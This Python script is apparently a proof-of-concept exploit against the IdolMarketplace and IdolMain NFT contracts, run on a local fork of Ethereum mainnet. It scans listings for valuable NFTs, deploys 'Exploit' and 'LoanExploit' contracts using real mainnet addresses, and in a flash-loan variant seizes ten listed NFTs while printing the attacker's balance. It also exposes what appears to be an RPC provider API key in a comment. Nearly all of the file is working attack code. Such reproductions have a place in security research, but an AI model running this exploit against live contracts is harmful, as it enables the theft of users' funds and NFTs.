# author: cswmchen
# date: 3-20-2022
# cmd : ganache-cli -f https://eth-mainnet.alchemyapi.io/v2/dHlJj2SlFqPk3om_p9NzoiCArk66bHnM@14340000 --accounts 10 -u 0,  --chainId 1111 --gasLimit 3000000000000

# pip install py-solc-x web3
import  os
from web3 import Web3
import solcx


def get_market_NFTs():
    w3 = run_rpc()

    idolMarketplaceContract_addr = "0x4CE4f4c4891876fFc0670BD9a25FCc4597db3bBF"

    solc_res = solcx.compile_files(
        ["./contracts/IdolMarketplace.sol"],
        import_remappings=["@openzeppelin="+os.getcwd()+"/openzeppelin-contracts"],
        output_values=["abi", "bin"],
        solc_version="0.8.9"
        )

    idolMarketplaceContract = w3.eth.contract(address=idolMarketplaceContract_addr, abi=solc_res["contracts/IdolMarketplace.sol:IdolMarketplace"]['abi'])

    profitable_nfts = list()
    for idx in range(1000, 4000):
        nft = idolMarketplaceContract.caller().godListings(idx)
        if nft[1] > w3.toWei(1, "ether"):
            profitable_nfts.append(idx)
            print(idx)


    print("Profitable NFTs: ", profitable_nfts)



def run_rpc():
    w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545", request_kwargs={'timeout': 120}))
    assert w3.isConnected() == True, "[ERROR] Testnet is not activated."
    return w3


def get_balance(w3, address):
    return w3.eth.get_balance(address)


def direct():
    w3 = run_rpc()

    targetNFT = 1005
    idolMarketplaceContract_addr = "0x4CE4f4c4891876fFc0670BD9a25FCc4597db3bBF"
    IdolMainContract_addr = "0x439cac149B935AE1D726569800972E1669d17094"
    attacker_addr = w3.eth.accounts[0]

    solc_res = solcx.compile_files(
        ["./contracts/Exploit.sol", "./contracts/IdolMarketplace.sol", "./contracts/IdolMain.sol"],
        import_remappings=["@openzeppelin="+os.getcwd()+"/openzeppelin-contracts"],
        output_values=["abi", "bin"],
        solc_version="0.8.9")
    _f = lambda x, y : w3.eth.contract(address=x, abi=solc_res[y]['abi'])

    idolMainContract = _f(IdolMainContract_addr, "contracts/IdolMain.sol:IdolMain")
    idolMarketplaceContract = _f(idolMarketplaceContract_addr, "contracts/IdolMarketplace.sol:IdolMarketplace")

    # buy one
    if idolMainContract.caller().ownerOf(targetNFT) != attacker_addr:
        print("Buy idol({}) using 50 ETH".format(targetNFT))
        _tx_hash = idolMarketplaceContract.functions.buyGod(targetNFT).transact({'from':attacker_addr, 'value': w3.toWei(50, 'ether')})
        _receipt = w3.eth.wait_for_transaction_receipt(_tx_hash)
        assert _receipt["status"] == 1
        print("Balance of idol marketplace: {}".format(get_balance(w3, idolMarketplaceContract.address)))
        print("Balance of attacker        : {}".format(get_balance(w3, attacker_addr)))

    _r = solc_res["contracts/Exploit.sol:Exploit"]
    _tx_hash = w3.eth.contract(abi=_r['abi'], bytecode=_r['bin']).constructor().transact({'from': attacker_addr})
    _receipt = w3.eth.wait_for_transaction_receipt(_tx_hash)
    assert _receipt["status"] == 1
    expContract = w3.eth.contract(address=_receipt['contractAddress'] , abi=_r['abi'])

    # transfer the NFT to the agent contract
    _tx_hash = idolMainContract.functions.transferFrom(attacker_addr, expContract.address, targetNFT).transact({'from':attacker_addr})
    _receipt = w3.eth.wait_for_transaction_receipt(_tx_hash)
    assert _receipt["status"] == 1

    print("Exploiting...\n\n\n")

    _tx_hash = expContract.functions.attack(targetNFT).transact({'from':attacker_addr, 'value': w3.toWei(3, 'ether')})
    _receipt = w3.eth.wait_for_transaction_receipt(_tx_hash)
    assert _receipt["status"] == 1

    print("Balance of idol marketplace: {}".format(get_balance(w3, idolMarketplaceContract.address)))
    print("Balance of attacker        : {}".format(get_balance(w3, attacker_addr)))


def flashload():
    w3 = run_rpc()

    IdolMainContract_addr = "0x439cac149B935AE1D726569800972E1669d17094"
    idolMarketplaceContract_addr = "0x4CE4f4c4891876fFc0670BD9a25FCc4597db3bBF"
    liquidityPool_address = "0x24a42fD28C976A61Df5D00D0599C34c4f90748c8"
    attacker_addr = w3.eth.accounts[0]

    print("Balance of attacker        : {}".format(get_balance(w3, attacker_addr)))

    nfts = [
        1005, 1074, 1862, 2008, 2106,
        2607, 2668, 2700, 3320, 3544,
    ]

    # deploy
    solcx.install_solc('0.6.6')
    solc_res = solcx.compile_files(
        ["./contracts/LoanExploit.sol"],
        import_remappings=["@openzeppelin="+os.getcwd()+"/openzeppelin-contracts-3.4.2"],
        output_values=["abi", "bin"],
        solc_version="0.6.6")

    _r = solc_res["./contracts/LoanExploit.sol:LoanExploit"]
    _tx_hash = w3.eth.contract(abi=_r['abi'], bytecode=_r['bin'])\
        .constructor(liquidityPool_address,
                     idolMarketplaceContract_addr,
                     IdolMainContract_addr
                    ).transact({'from': attacker_addr})
    _receipt = w3.eth.wait_for_transaction_receipt(_tx_hash)
    assert _receipt["status"] == 1
    expContract = w3.eth.contract(address=_receipt['contractAddress'] , abi=_r['abi'])


    _tx_hash = expContract.functions.attack(w3.toWei(1000, "ether"), nfts).transact({'from':attacker_addr, 'gas':6721075})
    _receipt = w3.eth.wait_for_transaction_receipt(_tx_hash)
    assert _receipt["status"] == 1

    # verify
    solc_res = solcx.compile_files(
        ["./contracts/IdolMain.sol"],
        import_remappings=["@openzeppelin="+os.getcwd()+"/openzeppelin-contracts"],
        output_values=["abi", "bin"],
        solc_version="0.8.9")
    idolMainContract = w3.eth.contract(address=IdolMainContract_addr, abi=solc_res["contracts/IdolMain.sol:IdolMain"]['abi'])

    for nft in nfts:
        print("Owner of {} nft : {}".format(nft, idolMainContract.caller().ownerOf(nft)))

    print("=>> Balance of attacker        : {}".format(get_balance(w3, attacker_addr)))


if __name__ == "__main__":
    # get_market_NFTs()
    flashload()
    #direct()



